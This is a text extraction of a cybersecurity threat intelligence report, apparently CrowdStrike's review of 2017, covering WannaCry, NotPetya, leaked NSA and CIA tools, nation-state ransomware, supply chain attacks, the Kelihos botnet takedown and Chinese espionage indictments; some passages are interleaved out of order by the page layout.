FOREWORD

It's been another banner year for bad actors.
Not only did the volume and intensity of
cyberattacks hit new highs, the overall level
of sophistication across the global threat
landscape experienced a meteoric rise. The
theme of this year’s report, “Blurring the Lines
Between Statecraft and Tradecraft,” reflects
this disturbing trend.
There are several factors contributing to this
fundamental leveling of the playing field
between highly skilled — and typically wellfunded — nation-state adversaries and their
less sophisticated criminal and hacktivist
counterparts. One of the biggest contributors
is the “trickle-down effect” present in the
cyberthreat arena.
The idea of trickle-down is not new. In fact,
it’s precisely how state-sponsored research
and development programs are supposed
to work: Governments fund development
of sophisticated technologies, and those
eventually get transferred out to the private
sector as products and services. Consider
GPS. It was originally designed for military
applications, from missile targeting to tracking
objects and assets on the ground. Now
everyone has GPS in their pocket, and in their
car. It’s so ingrained in our daily lives, it’s
hard to remember how we ever managed
without it. That’s a textbook example of how
government-sponsored technology can
successfully trickle down to the masses.
Unfortunately, there’s also a dark side to this
phenomenon. That was certainly the case with
WannaCry. This crippling malware epidemic
was based on military-grade espionage
techniques around a Windows vulnerability
known as EternalBlue, which ultimately fell into
the wrong hands. A great deal of effort, time

and money went into its development and,
regrettably, it was leaked.

The result of trickle-down in the field
of cybersecurity has been a proliferation of
military-grade weaponry for cyberwarfare being
pushed down into the masses and commoditized.
The consequences to legitimate organizations
has been alarmingly clear. What makes these
attacks so effective is that they are essentially
immune to the traditional endpoint defense
technologies that most organizations have
relied on for the past 20 or more years.
As this report points out with great clarity, it’s
time for the good guys to step up. Defending
against “government-grade” attacks requires
enlisting a host of new security technologies
and approaches that go beyond the simple
signature-based prevention of the past. Check
the Recommendations section of this report
for actionable steps each of us can take to
combat the potentially disastrous effects of
trickle-down cyberattacks.
I sincerely hope that this document helps your
understanding of important shifts in the threat
landscape, and provides the information you
need to make your organization more resilient,
more prepared and better protected, so that
together, we can stop breaches.

EXECUTIVE
SUMMARY
During the past year, stolen and vulnerable data proved to be valuable weapons
for adversaries of every stripe, spanning across all geographies, affiliations
and motivations. Data extortion, data ransom and outright theft have affected
both large and small organizations throughout the world. Data even facilitated
the most destructive attacks of the year when stolen cyber espionage tools,
EternalBlue and DoublePulsar, were first leaked by the Shadow Brokers, and then

update packages was a rising TTP. This malware
dissemination technique was notably used in
the NotPetya campaign in late June 2017, but it
was observed throughout the year from eCrime
and targeted intrusion adversaries. Underlying
all of these TTP trends is an overall effort to avoid
attribution, blend in with the crowd and otherwise
challenge the computer network defender.

rapidly incorporated into targeted intrusion and criminal campaigns, including

Score One For The Good Guys

WannaCry and NotPetya. The rapid adoption of these leaked state-sponsored

The coordinated multi-agency takedowns
of major eCrime actors and networks during
2017 helped balance the scales and disrupt
operations of profit-driven cybercrime groups.
Given the tenacity and anonymity that surrounds
many cybercriminals, law enforcement actions
such as takedowns, arrests, and the sentencing
of individuals who are involved in cybercrime
are major successes for law enforcement
agencies. These actions often temporarily
splinter the criminal community, as actors
examine their operational security and look for
alternative methods for committing their crimes.

tactics, techniques and procedures (TTPs) is emblematic of one of the most
prominent and alarming trends observed in the gathering of this report: namely,
the intermingling and cross-pollination of TTPs across the spectrum from
sophisticated nation-state actors to the opportunistic criminal element.

Blurred Lines
The blurring of lines referenced in the title of
this report has manifested in various ways in
the past year. In many cases, less technically
adept actors “upped their game” by employing
TTPs that would normally be above their
pay grade. In other instances, state-affiliated
actors known for their highly evolved targeted
intrusion TTPs took a page from lowerechelon eCrime adversaries. For example, the
WannaCry and NotPetya attacks heralded the
rise of nation-state-sponsored ransomware,
as CrowdStrike Falcon Intelligence and other
organizations linked the malware and TTPs
used in these operations to the Democratic
People’s Republic of Korea (DPRK) and Russia,
respectively. Although the repurposing of
criminal malware is not a new phenomenon
(particularly for Russian adversaries), this is a

notable trend considering ransomware’s rapid
growth in 2016 and 2017, suggesting targeted
intrusion adversaries are taking note of what
is successful in the eCrime marketplace.
Likewise, WannaCry and NotPetya appeared
to influence criminally motivated adversaries
when a rise in the use or development of
Server Message Block (SMB) spreading
techniques appeared in eCrime operations in
the late summer of 2017.

Expanding Exploits
Exploits continue to proliferate across the
threat landscape, as was observed in the rapid
spread of CVE-2017-0199, among others. Actoragnostic TTP trending also showed a rise in
the use of commodity tools and penetrationtesting software (e.g., Cobalt Strike). Supply
chain attacks incorporating poisoned software

Undetected Malware
and Breakout Time
Although an interesting trend observed during
the past year was an increase in malwarebased over malware-free attacks, a more
sobering finding was that 39 percent of all
incidents in 2017 were malicious software
that went undetected by traditional antivirus,
leaving organizations relying on these legacy
solutions openly vulnerable to these threats
and demonstrating a need for next-generation
endpoint protection.
According to incidents CrowdStrike investigated,
the average “breakout time” in 2017 was 1 hour

and 58 minutes. Breakout time indicates how
long it takes for an intruder to jump off the initial
system (beachhead) they had compromised
and move laterally to other machines within the
network. This statistic shows how much time
on average defenders have to detect the initial
intrusion, investigate it and eject the attacker
from the network before they bury themselves
deeper and steal or destroy sensitive data, which
can make remediation much more complex.

Get A Room
While government, healthcare and financial
organizations remained among the most
preferred prey of eCrime and targeted intrusion
actors, the hospitality sector emerged in the
past year as a growing target for criminals and,
in a more unsettling turn, nation-state adversary
groups, as well. International hotel chains, in
particular, offer ripe picking for financial crimes,
from stealing identities to pilfering credit card
numbers via point-of-sale transactions. Stateaffiliated adversaries have also developed a
deep interest in the lodging sector, whether
for tracking persons of interest while they are
traveling, or to enable access to these potential
victims when they use electronic devices
outside the confines of protected networks.

Introduction
CrowdStrike Falcon Intelligence introduced 16 new actor profiles
in 2017 - nine eCrime adversaries and seven targeted intrusion
adversaries - bringing the total of identified, named adversaries
to 95. In the following section, the Falcon Intelligence team
presents highlights from the most significant events in the
cyberthreat landscape. The analysis presented demonstrates how
threat intelligence can provide a deeper understanding of the
motivations and objectives of these actors, and how to use that
information to better defend your organization.

Weaponization of Data
On September 7, 2017, consumer credit reporting agency
Equifax announced a cybersecurity incident potentially
impacting more than 143 million U.S. consumers, making this
incident one of the largest reported breaches of 2017. Although
such big events garner headlines, the scale of the problem
can be obscured by the sheer volume of data breaches
that occur on a daily and weekly basis. In many ways, the
unintended compromise of data can be “death by a thousand
cuts” for consumers who have offered their information up to
online forms servicing a plethora of organizations, from their
local school boards to their doctors’ offices.
In fact, the top two sectors in CrowdStrike data breach
reporting have been government and healthcare. At least half
of these reported incidents concerned smaller organizations
— city-level entities in the case of the government, and
local hospitals and doctors’ offices in the case of healthcare.
The high percentage of occurrences in these sectors may
be due to penalties imposed on organizations for failure to
report a data exposure. Regardless, the evidence shows that
ransomware and extortion attacks are extremely common in
both sectors.
Financially motivated adversaries targeted retail and
hospitality sectors with attacks focused on point-of-sale (PoS)
devices, an operational model that often results in the resale
of stolen credit cards in criminal marketplaces. Large-scale
criminal operations from adversaries such as CARBON SPIDER
and COBALT SPIDER can often fuel more sophisticated
PoS operations.

In addition to the disclosed Equifax breach, one-third of the
reported financial sector breaches affected cryptocurrency
companies with an array of threats, from attempts to steal
tokens to the compromise of systems via spear phishing.
Although the rising value of cryptocurrencies may lead one to
believe these are eCrime threats, it is possible such operations
are undertaken by nation-states aiming to increase revenue
(e.g., DPRK).

Even the Equifax breach may have been the work of targeted
intrusion adversaries. While not attributed to a particular
actor, open-source reporting has indicated investigators
are researching whether a state-sponsored adversary is
responsible. Previously, Chinese state-sponsored actors were
linked to large-scale data breaches at health insurers and the
U.S. Office of Personnel Management (OPM) in 2015. As was
the case with these previous breaches, and those that fueled
the Shadow Brokers and WikiLeaks releases this year (noted
below), the effects of many of the reported breaches of 2017
may not be known for some time.

Data from Previous Breaches of U.S.
Intelligence Agencies Released
The U.S. intelligence community was particularly
affected by data breaches. These include public
disclosures of purported tools used by the
Central Intelligence Agency (CIA) via WikiLeaks
throughout 2017, and the Shadow Brokers’
leak of National Security Agency (NSA) tools
and exploits in April of that year. Although both
breaches likely occurred prior to 2017, serious
effects of the leaks were more fully realized
in 2017.
Shadow Brokers
On April 8 and April 14, 2017, the Shadow Brokers
threat actor announced the public disclosure of
tools and exploits, which they claim were used
by the targeted intrusion adversary publicly
known as the Equation Group. The April 8 release
purportedly included Unix tools and exploits.
The April 14 release included exploits and
tools designed to target several versions of the
Windows operating system and related
enterprise software.
Included in the leaked tools were the
Eternal family of exploits/vulnerabilities and
the backdoor DoublePulsar. These were
incorporated by a large number of malicious
adversaries. The EternalBlue vulnerability in
particular fueled fast-propagating operations
such as WannaCry and NotPetya. Additional
eCrime operations, which did not explicitly
include Eternal exploits, were nevertheless
inspired to experiment with SMB-spreading
mechanisms.
WikiLeaks Vault 7 and Vault 8
On March 7, 2017, WikiLeaks began publishing
documents under a program dubbed Vault 7.
Subsequent releases occurred every one to
two weeks until September 2017. For the Vault 7
releases, WikiLeaks disclosed the configuration,
installation and operation manuals for many
pieces of malware, but did not release specific
exploit or malware code for any of these
products. This decision was amended for the
Vault 8 releases, which began on Nov. 9, 2017.
The aim for Vault 8 appears to be to provide
source code and analysis for CIA cyber tools,
including those described in the previous Vault
7 series.

13

WikiLeaks claimed that the purpose of this
series of leaks was “to initiate a public debate
about the security, creation, use, proliferation
and democratic control of cyber weapons.”
The effect of Vault 7 was likely an international
awareness of the capabilities of the U.S.
intelligence community. With the decision to
include source code in the Vault 8 releases,
the chances of malicious tools being
repurposed increases significantly.

— naming the victim in social media, for example,
and interacting with technology journalists.

2018
Outlook

Self-Serving Extortion Actors
Although not all data exposures are the result
of malicious actors, several significant breaches
occurred in 2017, highlighting the need for
tighter security over data and the popularity of
data acquisition by a variety of actors intent on
ransoming or otherwise monetizing it.
OurMine: Self-Proclaimed Gray Hat Group
CrowdStrike Falcon Intelligence saw renewed
activity from the self-styled security group
OurMine. This adversary appears to be a
financially motivated gray-hat-like group that
compromises social media accounts and
websites, stealing data in order to publicly
shame companies, then urging them to buy
their security services. Despite its claim to now
represent a legitimate company, OurMine team
tactics can still be characterized as extortive.
This group claimed to have compromised both
Home Box Office (HBO) and Sony PlayStation
Network (PSN), which demonstrates a focus on
entertainment and technology sector victims.
Falcon Intelligence assesses that OurMine
comprises multiple members, some of
whom reside in Saudi Arabia.
OVERLORD SPIDER: Aggressively Monetizing
High-Profile Data
This adversary targets entertainment and
healthcare sector targets with undisguised data
extortion attacks. OVERLORD SPIDER relies on
the relatively poor security practices of small or
less-sophisticated firms, and takes advantage of
the potential legal, financial and public relations
liabilities resulting from the potential loss of
customers’ data. Thus, the main extortive threat
from this actor involves the release of personally
identifiable information (PII) belonging to highprofile customers of the victim company. To raise
awareness of the breach, OVERLORD SPIDER

Data Breaches & Exposure

A third of all CrowdStrike reporting on data breaches references
inadvertent or accidental disclosure, but even these unintentional
exposures can lead to malicious activity. Actors across the motivation
spectrum have taken advantage of unsecured data.

State-Sponsored Ransomware
This year was punctuated by high-profile
campaigns linked to nation-states in which
ransomware may have been used for
financial or disruptive purposes, or instances

where destructive malware was disguised
as ransomware. What was once a criminally
motivated operation model appears to have
been adopted by nation-states that are seeking
alternative sources of income (e.g., DPRK) or a
means to disable opponents (e.g., Russia).

WANNACRY
Heralding the Rise
of Nation-State Linked Ransomware
On May 12, 2017, a new ransomware family called
WannaCry began making headlines as it rapidly
infected the networks of organizations across the
globe. The scale of this attack, which expanded
rapidly over the course of a single day, was
unique. The authors of this malware incorporated
sophisticated propagation techniques, leveraging
the recently released EternalBlue vulnerability
(CVE-2017-0144) and the DoublePulsar
backdoor. The self-propagation aspect of this
malware ensured a high infection rate among

15

organizations that had not yet implemented the
associated updates to their systems.

A Series of Ransomware and PseudoRansomware Campaigns Targeted Ukraine
On June 27, 2017, another apparent ransomware
variant named NotPetya began to spread
globally using the EternalBlue vulnerability.
This activity initially elicited comparisons to
the WannaCry campaign. However, technical
analysis revealed an extensive operation using
several ransomware variants that appeared to
specifically target Ukrainian users.

The demand for Bitcoin and indiscriminate
targeting profile suggests that the adversary
behind this campaign was financially motivated,
much like previously observed eCrime threats.
However, code overlaps with malware linked
to DPRK adversaries implied this operation was
state-sponsored. Following months of reporting
that intelligence agencies had attributed the
attack to DPRK state-sponsored actors, on Dec.
18, 2017, the U.S. government directly credited
North Korea with creating and distributing the
malware.

In addition to the use of EternalBlue in the
NotPetya campaign, these operations leveraged
multiple TTPs to infect devices and propagate
these ransomware variants. These TTPs
included supply chain interdiction, strategic
web compromises and credential harvesting to
facilitate propagation. In the case of NotPetya
specifically, file recovery was not possible,
indicating this was not a financially motivated
operation, but rather a destructive attack
disguised as ransomware. These TTPs, as well
as the choice of targets, suggest this operation
is aligned with Russian state-sponsored hackers.

attempt by DPRK actors to use ransomware.
Sensitive source reporting identified an
earlier campaign, allegedly active between
December 2016 and March 2017, that leveraged
the commodity ransomware VenusLocker.
Samples from this cluster of VenusLocker
activity featured the ability to encrypt Hangul
Word Processor (HWP) and a Korean-language
extortion message, suggesting South Korea
was a specific target for this operation.

Technical analysis of
the toolset used by
DPRK adversaries has
supported a codesharing hypothesis

Initial infections of NotPetya appeared on
systems running a legitimate updater for the
document management software M.E.Doc.
Ukrainian companies and companies operating
in Ukraine rely on the M.E.Doc software to
maintain tax information and payroll accounting.
Subsequently, CrowdStrike Falcon Intelligence
was able to confirm through Falcon telemetry
that M.E.Doc updates were an initial infection
vector for NotPetya. Additional reports indicate
that a separate malware family, XData, was also
pushed by these software update packages
as early as May 2017. Falcon Intelligence
assesses it is highly likely that Russia-based
adversaries had awareness of M.E.Doc, given
the widespread integration of this software into
business and government communications.

Many of these campaigns appeared to imitate
ransomware on the surface. However, the true
intent of these operations was not financial
gain, as is typically the case with ransomware
— it was to destroy data on targeted networks.
The XData campaign, for example, did not
provide a payment amount or guidance on
how file recovery could occur. The operators of
NotPetya initially offered an email to facilitate
payment, but this address was suspended
shortly after news of the malware broke. A
truly financially motivated actor likely would
not have implemented such a fragile payment
mechanism, indicating the motivation for
the actor behind NotPetya was not financial
gain, but rather data destruction. Moreover,

16

the developers of NotPetya altered Petya
ransomware to erase the decryption key after
encrypting the master file table (MFT). This
technique offers no method to recover the files,
making NotPetya a wiper, not ransomware.
It should also be noted that the NotPetya
developers altered the Petya binary, suggesting
the adversary did not have access to the source
code, and therefore, reverse-engineered the
malware. This also reaffirms the assessment
that NotPetya and Petya were created by
separate developers.
The NotPetya successor BadRabbit adhered
more closely to the designation of ransomware,
technically enabling data recovery, although
the process for acquiring a recovery key did not
appear to be user-friendly and it is unknown

17

whether the attacker would have responded
with the required information. The lack of
concern for file recovery strongly suggests the
adversary is not financially motivated, but rather
seeking to harass the victim organizations —
and possibly to erode trust in the networks that
support a variety of essential functions for the
affected companies and government entities.
Masking these attacks as eCrime is reminiscent
of a Russian military doctrine known as
maskirovka, which features deception,
concealment and disguise. The goal of
maskirovka is not only to deceive or confuse
an adversary, but also to hide the true origin or
intent of an operation. Although NotPetya was
eventually revealed to be a wiper, the veneer of
ransomware delayed this initial assessment.

Middle East Origins
IsraBye

Tyrant and WannaSmile

Discovered in early August 2017, IsraBye is a
wiper that displays a ransom message listing
fictitious conditions for file recovery. Technical
analysis indicated the developer likely intended
that the files be destroyed permanently.
When executed, the malware displays antiIsraeli and pro-Palestinian imagery, rhetoric
and audio content on victim machines while
overwriting files and appending their names
with the .israbye suffix. The displayed content
contained references to the Al Aqsa Mosque
compound, reinforcing the intended timing of
this operation, which coincided with clashes
surrounding controversial July 2017 security
measures put in place by Israeli security
service at the Al Aqsa compound. The antiIsrael content and the timing of this malware
operation indicate that it was almost certainly
politically motivated. Multiple elements of the
wiper are indicative of a hacktivist developer.
For instance, the background image used
for the wiper is identical to a defacement
page used by the Palestinian hacktivist group
Giant’s-ps.

Throughout the latter part of 2017, Falcon
Intelligence observed an increase in
ransomware attacks targeting internet users in
locations where the Farsi language is spoken.
Open-source reporting listed at least two
recent cases, in October and November 2017,
involving ransomware families called Tyrant
and WannaSmile. Although reports suggested
these cyber operations were criminal in nature,
Falcon Intelligence assesses that both the
Iranian government and state-sponsored actors
could have equal motivation for conducting
these attacks.
According to an Iranian government authority,
the Psiphon virtual private network (VPN)
software was spoofed by the purported
operators of the Tyrant campaign and used
to distribute the ransomware. Psiphon is used
to evade government censorship and filtering
efforts, and thus, this software and its users are
likely targets for the Iranian government. Iran
has an extensive history of targeting popular
applications such as Psiphon with restrictions

and strict regulations. If the Tyrant operation
was motivated by domestic security interests,
this case highlights the potential that the Iranian

2018
Outlook

government uses the cover of cybercrime
operations to disrupt or poison the uptake of
software such as Psiphon.

Nation-State-Linked and Targeted Ransomware
High-profile attacks in 2017 have introduced the possibility that ransomware
could be used for geopolitical, and even militaristic, purposes. It is possible this
trend of nation-state ransomware has plateaued, but it is even more likely that
other nations — perhaps smaller countries — or even hacktivist groups will
use ransomware and pseudo-ransomware wipers to disrupt victims, eroding
trust between vital businesses and their customers or between governments
and their constituencies.
In 2017, these attacks used TTPs that were novel and trending in 2017, including
the use of the EternalBlue vulnerability and the compromise of software update
supply chains. Incidents described here can be characterized by the combination
of eCrime ransomware operations and targeted intrusion techniques. Therefore,
in 2018 and beyond, new campaigns could incorporate the latest vulnerabilities
or additional TTPs that have not been previously observed or associated with
ransomware campaigns.

The Takedown Effect
Falcon Intelligence reported on several law
enforcement actions targeting cybercrime
(see Figure 2). Such efforts included arrests,
botnet takedowns, shutting down forums
associated with criminal activity, and legal
injunctions against infrastructure. In some
cases, these operations require cooperation
among multiple international law enforcement
agencies with assistance from private and
non-profit cybersecurity elements. The ZOMBIE
SPIDER takedown, described below, is a
notable example of how broad support for a

law enforcement operation can create a ripple
effect in the eCrime ecosystem.
An example of this ripple effect was observed
in July 2017, with the takedowns of the
darknet markets AlphaBay and Hansa, a
collaboration between multiple international
law enforcement agencies — notably, the Dutch
National Police and the U.S. Federal Bureau
of Investigation (FBI). In combination with the
collapse of TradeRoute, the operation against
AlphaBay and Hansa has led to months of

both HOUND SPIDER and INDRIK SPIDER faced
legal action. Although these arrests may not
dismantle the larger criminal enterprise, they
can prompt other actors to examine the risks
they are taking when engaging in cybercrime.

On a smaller scale, legal proceedings can be
an effective means to handle individual eCrime
actors. In December 2017, individual affiliates of

The Fall of ZOMBIE SPIDER
On April 7, 2017, Pytor Levashov — who
predominantly used the alias Severa or Peter
Severa and whom Falcon Intelligence tracks
as ZOMBIE SPIDER — was arrested in an
international law enforcement operation led
by the FBI. ZOMBIE SPIDER’s specialty was
large-scale spam distribution, a fundamental
component of cybercrime operations. Levashov
was the primary threat actor behind a botnet
known as Kelihos and its predecessors, Waledac
and Storm. In addition to Levashov’s arrest, there
was a technical operation conducted by Falcon
Intelligence to seize control of the Kelihos botnet.
The Kelihos botnet was a peer-to-peer (P2P)
botnet that used infected systems as proxies
to relay information between each other and
the Kelihos backend servers. In order to seize
control of Kelihos, Falcon Intelligence leveraged
a technique known as peer list poisoning. This

(developed by BAMBOO SPIDER), Gozi ISFB and
Nymain, as well as large-scale phishing and
“pump-and-dump” stock campaigns. Prior to
the takedown operation, Kelihos was one of the
largest spam botnets on the criminal market.
It was originally estimated that an average of
40,000 machines were connecting to the P2P
Figure 2

Government

network per day, but following the takedown
operation, it was discovered that the number
of machines was in fact approximately 70,000
per day. In its final weeks of operation, Kelihos
predominantly supported campaigns for Shade
ransomware, Cerber ransomware, bank phishing
scams and money mule lures.

On Oct. 3, 2017, a Spanish court decided to extradite Levashov to the United States, an action
that the Russian Federation attempted to block by filing a counter-extradition request on Sept.
22, 2017. Levashov’s defense claimed that he had "access to information constituting state
secrets through the university in St. Petersburg." Furthermore, during the court proceedings,
Levashov claimed that he had worked for the United Russia Party for 10 years as an officer in
the Russian Army by “collecting various information on opposition parties.” According to
open-source reporting, United Russia has denied this claim.
CrowdStrike previously reported on Levashov’s potential affiliation with the Russian
government. In a forum post from 2013, his Severa persona discussed an offer that he
allegedly received from the FSB to lead a team in protecting Russia from electronic threats
and providing a reactive response, if required. If this forum post was indeed legitimate, it
provides a unique insight into the FSB’s recruitment campaigns and the suspected hiring
of criminal actors. It also hints that the Russian government will overlook criminal acts,
particularly operations that target Western nations, if they benefit the Russian state.
This provides cybercriminals who operate out of Russia a safe haven, and potential job
opportunities within the Russian government in addition to their criminal enterprises. This
aligns with Russia’s previous warning to its citizens against traveling to countries that have
an extradition treaty with the United States, due to the possibility of arrest and prosecution.

process propagated a carefully crafted peer
list that prevented the threat actor (in this case
ZOMBIE SPIDER) from communicating with
infected systems. As a result of the peer list
poisoning, the P2P network was transformed
into a centralized network, with infected
hosts only being able to communicate with
the sinkhole operated by Falcon Intelligence.
The IP address victim information collected
by the sinkhole was distributed by the nonprofit organization Shadowserver to global
internet service providers (ISPs) and computer
emergency response teams (CERTs) to assist
with remediation efforts.

Observed Changes
to eCrime Distribution

ZOMBIE SPIDER provided criminal services to
a large number of affiliates, with Kelihos spam
campaigns varying greatly over the years.
Although pharmaceutical spam was a threat
consistently supported throughout Kelihos’
lifespan, the botnet was also used to distribute
major banking Trojans such as Panda Zeus

With the Kelihos spam botnet no longer in
operation and ZOMBIE SPIDER behind bars,
multiple criminal operators moved to different
distribution methods. For example, Falcon
Intelligence has observed the Cutwail spam botnet
distributing Gozi ISFB and the Magnitude exploit
kit distributing Cerber ransomware.

MONTY SPIDER, operator of the CraP2P spam
botnet (aka Necurs spambot), appeared to be a
clear beneficiary of the Kelihos takedown. CraP2P
has not only distributed the pump-and-dump
spam, but has also picked up WIZARD SPIDER
and INDRIK SPIDER as possible customers.
Operators of ransomware — particularly Jaff,
Locky, and Globe Imposter — made use of
CraP2P for distribution during Summer 2017.

20

Spam Botnets and Law Enforcement
Spam botnets such as Cutwail and CraP2P, which have sustained operations
in the wake of the ZOMBIE SPIDER takedown, are likely to continue at
their current pace. However, established and well-resourced operations
may develop in-house solutions for distributing their malware, as was
observed from several banking Trojan operators experimenting with various
propagation methods.
Given the tenacity and anonymity that surrounds many cybercriminals,
law enforcement actions such as takedowns, arrests and the sentencing
of individuals who are involved in cybercrime are major successes for law
enforcement agencies. These actions often temporarily splinter the criminal
community, as actors examine their operational security (OPSEC) postures
and look for alternative methods for committing their crimes.
Despite the immediate results, disruptions can also create opportunities for
ambitious criminal operators or prompt adversaries to retool. Therefore,
continued vigilance is needed to assess the long-term effects on the
overall threat landscape.
Finally, financially motivated eCrime adversaries are not the only actors
subject to legal ramifications. As described in the China section below,
the U.S. Department of Justice (DoJ) announced several indictments against
Chinese individuals linked to likely nation-state espionage operations. U.S.
authorities may consider expanding this approach as a means to deter
individuals from assisting in targeted intrusion operations.

21

2018
Outlook

Exploit Proliferation
Although the rise of nation-state ransomware
was perhaps the most visible TTP trend of
2017, these attacks were enabled by several
other TTPs that appeared to be on the rise,
including the EternalBlue vulnerability and the
compromise of software update mechanisms.
In addition to EternalBlue, Falcon Intelligence
tracked the proliferation of several notable
vulnerabilities, including CVE-2017-0199 and
CVE-2017-8759, which demonstrated similar
trajectories.
The ability to incorporate newly publicized
vulnerabilities is an indication of a fairly
sophisticated adversary — one with
development resources sufficient to take
advantage of the vulnerability before large
organizations can apply available patches.
Figure 3 provides a timeline of how a few of the
notable exploits proliferated among several
adversaries, both criminally motivated groups
and state-sponsored actors.
As the exploit grows stale, it is often incorporated
into Metasploit modules or other custom builders,
thus opening the door for other groups to adopt
these TTPs. COBALT SPIDER is suspected of using
an exploit document builder. Such tools are for
sale on Russian underground marketplaces. This
adversary incorporated CVE-2017-0199, CVE2017-8759 and CVE-2017-11882 into their spearphishing operations shortly after zero-day.
Chinese adversaries also leveraged CVE-20170199, CVE-2017-8759 and CVE-2017-11882
into several disparate campaigns, likely at the
hands of multiple separate groups. The rapid
incorporation of all of these exploits into Chinabased operations suggests these adversaries

may have access to a centralized dissemination
channel for tools and exploits. It is also possible
that China was already aware of some or all of
these vulnerabilities. Recent industry reporting has
suggested that the Chinese National Vulnerability
Database (CNNVD) is a loose cover for the Ministry
of State Security (MSS) and provides early access
of vulnerabilities to China’s intelligence services
before publicly reporting them.

Software Update
Supply Chain Attacks
Software supply chain attacks have long
been associated with nation-state espionage
operations, but in 2017, this technique appeared
to spread. The infection of software update
processes was observed in criminally motivated
and destructive campaigns, in addition to likely
state-sponsored activity. Figure 4 provides a
summary of some of the notable incidents in
this TTP category.
CrowdStrike also observed a variation of this
tactic in which the attacker does not modify
the code, but instead uses brand-spoofing
to facilitate an attack. In such an operation, a
legitimate application is advertised as available
for download; upon download, a user is
prompted to update the software via adversarycontrolled infrastructure, thus providing an
avenue for malicious execution. This type of
attack was used to distribute ProtonRAT in
November 2017. The operation involved the
registration of a domain, symantecblog[.]com,
which spoofs the blog for the information
security provider Symantec. The available
hyperlink for downloading an antivirus tool from
that page consisted of a MacOS application
that delivers ProtonRAT.

Findings Part 1

TARGETED

INTRUSION

Introduction

In 2017, Falcon Intelligence identified targeted intrusion activity from across the globe.
The following sections provide an overview of observed incidents attributed to adversaries
in China, Russia, Iran, and North Korea. These campaigns are likely state-sponsored
operations supporting intelligence or military requirements. Additionally, Falcon
Intelligence continues to observe activity from the Indian subcontinent and named two
new adversaries to assist in tracking these incidents -- the Pakistan-based MYTHIC
LEOPARD and India-based QUILTED TIGER, publicly known as Patchwork. These adversaries
and others are detailed in Table 9.

China
Activity from China-based adversaries
targeted multiple separate countries and
industry sectors in 2017. Although this
broad range of interests appears disparate,
information on many of the targeted
government entities likely supports intelligence
requirements for military or diplomatic decision
making. Observed targeting of other sectors
— including technology, industry, aerospace,
telecommunications, and energy — likely
supports high-priority projects for the 13th
Five Year Plan (FYP), such as the Belt Road
Initiative (BRI).
The BRI represents China’s desire to expand
its influence internationally through support to
logistical supply routes and new infrastructure
projects. Because investments into these
projects span the globe, targeting has been
observed in widely diverse regions, such as
Belarus in Eastern Europe and Cambodia in
Southeast Asia.
Regional geopolitical concerns also appear
to drive a high percentage of Chinese targeted
intrusion activity. The targeting of Southeast

Asian countries reflects not only China’s heavy
investment in large infrastructure projects
within the region, but also ongoing territorial
disputes in the South China Sea (SCS). Similarly,
in the latter half of the year, suspected Korean
Peninsula targeting was observed concurrent
with a rise in North Korean and American
rhetoric regarding DPRK’s nuclear program.
In some cases, adversaries appeared to shift
targeting based on these high-profile
current events.
Many Chinese adversaries demonstrated
the capacity to quickly incorporate new
vulnerabilities, specifically CVE-2017-0199
and CVE-2017-8759. Additionally, adversaries
such as NUMBERED PANDA appear to have
broadened their toolkits. Activity from this
adversary in July and October used the same
infrastructure, but different malware families.
Evidence from 2017 also suggests many Chinabased actor groups have adopted commodity
or open-source tools such as Cobalt Strike.
These toolkit choices are likely driven by an
increased level of operational security and
a desire to complicate attribution.

Contract for Espionage
Given the reorganization of China’s People's
Liberation Army (PLA) and a noted shift in activity
from WICKED PANDA (formerly associated with
financially motivated attacks), Falcon Intelligence
predicted a rise in China-based targeted
intrusion activity undertaken by contractors in
2017. Contract companies — founded by leaders
in computer science and maintaining a wide
social network based on connections made
via old hacking forums — may be uninhibited
by bureaucracy that affects the PLA or large
Chinese intelligence organizations. If true, these
adversaries can likely execute operations and
incorporate tools more rapidly.
Throughout 2017, WICKED PANDA embodied
what Falcon Intelligence would expect from
a contract entity. This adversary improved
operational security and anti-analysis TTPs,
evidenced by the use of machine-specific
decryption keys. The use of dead-drop
resolver (DDR) command and control (C2),
obfuscation techniques, and encrypted payloads
demonstrates a higher sophistication than
what was previously observed from Chinese
adversaries associated with the PLA. WICKED
PANDA continued to target a diverse set of
sectors and regions, possible evidence that
official tasking is provided for specific operations
that require these advanced techniques.
Contract entities may also be able to cast a
wide net for victims, sitting on the compromise
until they can effectively use the access. TTPs
for acquiring large numbers of potential victims
include strategic web compromises, supply
chain compromises and mass spear phishing.
Chinese Nationals with Links to Cyber
Espionage Named in DoJ Indictments
Dismantling social relationships between
contractors and government officials will likely
prove to be difficult, but as part of this process,
the U.S. DoJ announced several indictments
aimed at Chinese nationals suspected of
contributing to nation-state espionage
operations. In late August, Yu Pingan (aka
GoldSun) was indicted in connection with a
series of high-profile attacks targeting western
aerospace and technology firms. Yu was accused
of providing material support to China-based

29

adversary groups in the form of Sakula, Hkdoor,
and Adjesus malware variants. The description of
the malicious activity detailed in the indictment
strongly corresponds to existing CrowdStrike
reporting, published in February 2014, describing
intrusion operations targeting several aerospace
organizations in 2012 and 2014. Additional
analysis of the infrastructure associated with the
2011-2014 activity and listed in the indictment
shows overlaps with TURBINE PANDA and
SAMURAI PANDA, adversaries that have also
targeted elements of the aerospace industry.
Following the GoldSun indictment, on November
27, 2017, the U.S. District Court of Western
Pennsylvania unsealed an indictment against
three employees of Chinese cybersecurity
company, Guangzhou Bo Yu Information
Technology Company Ltd. (Boyusec), charging
them with cyber-enabled theft of intellectual
property from three separate U.S. companies.
Boyusec was previously outed in public
reporting in November 2016 for its connections
to the Chinese Ministry of State Security (MSS)
and Chinese telecom giant Huawei. The three
individuals named in the indictment — Wu
Yingzhuo, Dong Hao, and Xia Lei — were all
employees of Boyusec, with Wu and Dong
being founding members and executives of the
company.
Though the indictment lays out charges for
intrusion activity conducted against U.S.
companies in the manufacturing, financial, and
aerospace sectors from 2011 through 2017, the
activities of Wu in particular can be traced back
to at least 2005, and they have been previously
identified by Falcon Intelligence as GOTHIC
PANDA. This adversary has historically used a
distinct implant known as Pirpi (aka UPS, as listed
in the indictment), and is known for a methodical,
persistent intrusion methodology with a high
degree of sophistication and OPSEC. Numerous
CrowdStrike reports have described GOTHIC
PANDA as a likely contractor for the MSS, based
on both its TTPs and operations that occurred
outside normal Beijing working hours.
The effect of these indictments may drive all
China-based activity to adopt better OPSEC
techniques, a process that has already been
observed with the use of commodity tooling
in a possible effort to hinder attribution. Within

China, individuals with connections to the old
hacking groups are likely training second and
third generations of technically savvy operators,
who can incorporate lessons learned by their
predecessors over the last decade.

2018
Outlook

China

Falcon Intelligence expects that 2018 will be another transitional year for
Chinese targeted intrusion activity. Groups associated with the PLA and
Technical Reconnaissance Bureaus (TRBs) may follow the lead of contract
